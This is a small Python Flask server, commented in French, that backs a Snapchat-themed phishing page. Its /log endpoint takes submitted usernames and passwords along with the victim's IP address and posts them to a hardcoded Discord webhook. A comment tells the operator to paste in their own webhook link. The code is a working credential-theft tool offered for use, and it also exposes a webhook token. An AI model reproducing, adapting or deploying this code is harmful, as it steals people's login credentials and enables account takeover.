from flask import Flask, request, send_from_directory
import requests
from datetime import datetime

app = Flask(__name__)

# REMPLACE L'URL CI-DESSOUS PAR TON LIEN DISCORD (garde les guillemets)
DISCORD_WEBHOOK ="https://discord.com/api/webhooks/1561730853447663718/GKSJ4VBo3VhpOXxZyo4CdW_vSdHCVj9t9XyjOCm71BWlR_pSLMgH51Wq1xBKTM-i2nPj"

@app.route('/')
def index():
    return send_from_directory('.', 'index.html')

@app.route('/log', methods=['POST'])
def log():
    data = request.get_json(silent=True) or {}
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    msg = f"🎯 **Snapchat**\nUser: `{data.get('username')}`\nPass: `{data.get('password')}`\nIP: {ip}"
    
    try:
        requests.post(DISCORD_WEBHOOK, json={"content": msg})
    except Exception as e:
        print("Erreur Discord:", e)
        
    return {"status": "ok"}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)